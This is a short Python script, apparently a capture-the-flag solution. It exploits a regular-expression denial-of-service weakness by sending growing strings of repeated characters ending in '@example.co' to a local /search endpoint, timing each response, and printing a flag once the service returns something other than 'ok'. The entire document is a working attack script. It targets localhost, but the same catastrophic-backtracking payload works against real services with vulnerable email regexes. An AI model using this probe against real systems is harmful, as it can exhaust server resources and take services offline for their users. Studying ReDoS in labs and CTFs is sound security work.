import requests
import time
import sys

if __name__ == "__main__":
    for length in range(30, 200, 10):
        print(f"\n[*] Trying length {length}")
        evil_string = "a" * length + "@example.co"
        
        try:
            start_time = time.time()
            response = requests.get("http://localhost:8080/search", 
                                  params={"q": evil_string})
            elapsed = time.time() - start_time
            
            print(f"[*] Request took: {elapsed:.2f} seconds")
            
            if response.text != "ok":
                print(f"[+] FLAG: {response.text}")
                break
            else:
                print(f"[-] Not slow enough yet...")
                
        except Exception as e:
            print(f"Error: {e}")